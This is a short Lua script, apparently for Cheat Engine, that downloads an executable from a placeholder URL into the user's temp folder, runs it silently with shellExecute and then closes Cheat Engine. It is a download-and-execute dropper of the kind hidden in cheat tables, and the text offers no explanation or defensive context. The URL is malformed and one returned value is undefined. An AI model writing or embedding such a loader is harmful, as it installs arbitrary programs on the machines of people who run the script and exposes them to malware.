function getFile(link)
  local path = os.getenv("temp").."\\file.exe"
  local file = io.open(path, "wb")
  file:write(getInternet().getURL(link))
  file:close()
  shellExecute(path)
  getInternet().destroy()
  closeCE()
  return caHide
end
getFile("https::/website.com/file.exe")
